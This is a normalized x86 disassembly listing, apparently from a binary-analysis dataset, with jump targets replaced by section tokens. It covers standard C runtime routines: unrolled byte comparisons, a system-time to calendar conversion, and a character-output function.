test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
mov eax edx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x8 ]
movzx ebx [ ecx + 0x8 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x6 ]
movzx ebx [ ecx + 0x6 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
mov eax edx
jmp r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x8 ]
movzx esi [ eax - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
jmp r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
mov esi [ eax + 0xc ]
cmp esi [ ecx + 0xc ]
je r-xdata
movzx esi [ eax + 0x9 ]
movzx ebx [ ecx + 0x9 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x7 ]
movzx ebx [ ecx + 0x7 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
test eax eax
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x7 ]
movzx esi [ eax - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0xc ]
movzx ebx [ ecx + 0xc ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xa ]
movzx ebx [ ecx + 0xa ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
mov esi [ eax + 0x10 ]
cmp esi [ ecx + 0x10 ]
je r-xdata
movzx esi [ eax + 0xd ]
movzx ebx [ ecx + 0xd ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0xb ]
movzx ebx [ ecx + 0xb ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx ebx [ ecx + 0x10 ]
movzx esi [ eax + 0x10 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xe ]
movzx ebx [ ecx + 0xe ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x14 ]
cmp esi [ ecx + 0x14 ]
je r-xdata
movzx esi [ eax + 0x11 ]
movzx ebx [ ecx + 0x11 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0xf ]
movzx ebx [ ecx + 0xf ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x14 ]
movzx ebx [ ecx + 0x14 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x12 ]
movzx ebx [ ecx + 0x12 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x18 ]
cmp esi [ ecx + 0x18 ]
je r-xdata
movzx esi [ eax + 0x15 ]
movzx ebx [ ecx + 0x15 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x13 ]
movzx ebx [ ecx + 0x13 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x18 ]
movzx ebx [ ecx + 0x18 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x16 ]
movzx ebx [ ecx + 0x16 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x1c ]
cmp esi [ ecx + 0x1c ]
je r-xdata
movzx esi [ eax + 0x19 ]
movzx ebx [ ecx + 0x19 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x17 ]
movzx ebx [ ecx + 0x17 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x1c ]
movzx ebx [ ecx + 0x1c ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x1a ]
movzx ebx [ ecx + 0x1a ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
add eax edx
add ecx edx
sub edi edx
movzx esi [ eax + 0x1d ]
movzx ebx [ ecx + 0x1d ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x1b ]
movzx ebx [ ecx + 0x1b ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x1e ]
movzx ebx [ ecx + 0x1e ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
movzx esi [ eax + 0x1f ]
movzx ebx [ ecx + 0x1f ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
sub_100220da
push [ rw-data ]
call sub_10027c38
pop ecx
test eax eax
je r-xdata
push 0x19
call sub_1002aae0
push 0x1
push 0x0
call sub_10024e9c
add esp 0xc
jmp sub_10024d85
call eax
sub_10022104
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
push 0x0
add eax 0x2ac18000
push 0x989680
adc ecx 0xfe624e21
push ecx
push eax
call sub_10027190
cmp edx 0x7
jl r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
jg r-xdata
leave
retn
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
or eax 0xffffffff
mov edx eax
cmp eax 0x93406fff
jbe r-xdata
sub_10022155
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp esi edi
jne r-xdata
push 0x24
push 0xff
push esi
call sub_100209e0
mov eax [ ebp + 0xc ]
add esp 0xc
cmp eax edi
je r-xdata
call sub_10026065
push 0x16
pop esi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] esi
call sub_10020579
add esp 0x14
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
cmp eax 0xffffffff
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
jg r-xdata
pop edi
pop esi
leave
retn
cmp eax 0x7
jl r-xdata
jl r-xdata
push ebx
push edi
push 0x1e13380
push eax
push ecx
call sub_100274c0
mov ecx eax
add ecx 0x46
lea eax [ ecx + 0x12b ]
cdq
mov ebx 0x190
idiv ebx
lea edi [ ecx - 0x1 ]
push 0x64
mov [ ebp - 0x8 ] edi
mov [ ebp + 0x8 ] ecx
mov ebx eax
mov eax edi
cdq
pop edi
idiv edi
push 0xffffffff
push 0xfffffe93
sub ebx eax
mov eax [ ebp - 0x8 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea eax [ ebx + eax - 0x11 ]
cdq
mov edi eax
lea eax [ ecx - 0x46 ]
mov ebx edx
cdq
push edx
push eax
call sub_10027200
sub eax edi
sbb edx ebx
push 0x0
mov ebx 0x15180
push ebx
push edx
push eax
call sub_10027200
mov edi [ ebp - 0x10 ]
add edi eax
adc [ ebp - 0xc ] edx
cmp [ ebp - 0xc ] 0x0
jg r-xdata
jg r-xdata
call sub_10026065
push 0x16
pop esi
mov [ eax ] esi
jmp r-xdata
cmp ecx 0xffff5740
jae r-xdata
mov eax [ ebp + 0x8 ]
mov ecx eax
and ecx 0x80000003
jns r-xdata
jl r-xdata
cmp ecx 0x934126cf
ja r-xdata
mov eax esi
jmp r-xdata
jne r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
mov eax [ ebp - 0x8 ]
add edi 0x1e13380
adc [ ebp - 0xc ] 0x0
mov ecx eax
and ecx 0x80000003
mov [ ebp + 0x8 ] eax
jns r-xdata
test edi edi
jae r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x76c
cdq
mov ecx 0x190
idiv ecx
test edx edx
jne r-xdata
push 0x64
cdq
pop ecx
idiv ecx
test edx edx
jne r-xdata
jne r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
mov eax [ ebp + 0x8 ]
push 0x0
push ebx
push [ ebp - 0xc ]
mov [ esi + 0x14 ] eax
push edi
call sub_100274c0
push 0xffffffff
mov [ esi + 0x1c ] eax
cdq
push 0xfffeae80
push edx
push eax
call sub_10027200
add edi eax
adc [ ebp - 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
mov edx rw-data
jne r-xdata
mov [ ebp - 0x4 ] 0x1
add eax 0x76c
cdq
mov ecx 0x190
idiv ecx
test edx edx
jne r-xdata
push 0x64
cdq
pop ecx
idiv ecx
test edx edx
jne r-xdata
mov eax [ esi + 0x1c ]
xor ecx ecx
inc ecx
cmp [ edx + 0x4 ] eax
jge r-xdata
mov edx rw-data
add edi ebx
adc [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec ecx
mov [ esi + 0x10 ] ecx
sub eax [ edx + ecx * 4 ]
push 0x0
mov [ esi + 0xc ] eax
mov eax [ ebp + 0xc ]
push ebx
push [ eax + 0x4 ]
push [ eax ]
call sub_100274c0
push 0x7
add eax 0x4
pop ecx
cdq
idiv ecx
xor ebx ebx
push ebx
push 0xe10
push [ ebp - 0xc ]
push edi
mov [ esi + 0x18 ] edx
call sub_100274c0
push 0xffffffff
mov [ esi + 0x8 ] eax
cdq
push 0xfffff1f0
push edx
push eax
call sub_10027200
push ebx
add edi eax
adc [ ebp - 0xc ] edx
push 0x3c
push [ ebp - 0xc ]
push edi
call sub_100274c0
mov [ esi + 0x4 ] eax
imul eax eax 0x3c
sub edi eax
mov [ esi + 0x20 ] ebx
mov [ esi ] edi
xor eax eax
pop ebx
mov ebx eax
inc ecx
cmp [ edx + ecx * 4 ] ebx
jl r-xdata
mov ebx 0x15180
sub_10022398
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1002ae52
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
push esi
call sub_10022155
neg eax
sbb eax eax
pop ecx
not eax
pop ecx
and eax esi
sub_100223bf
push 0xc
push r--data
call sub_10028b48
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0xc ]
cmp esi edi
setne al
cmp eax edi
jne r-xdata
push esi
call sub_100230d6
pop ecx
mov [ ebp - 0x4 ] edi
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_10026065
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_10020579
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
call sub_1002ae89
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_10028b8d
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100224c3
mov eax [ ebp - 0x1c ]
dec [ esi + 0x4 ]
js r-xdata
mov ecx rw-data
cmp eax 0xfffffffe
je r-xdata
push esi
push [ ebp + 0x8 ]
call sub_10029a45
pop ecx
pop ecx
mov ecx [ esi ]
mov al [ ebp + 0x8 ]
mov [ ecx ] al
movzx eax al
inc [ esi ]
jmp r-xdata
call sub_10026065
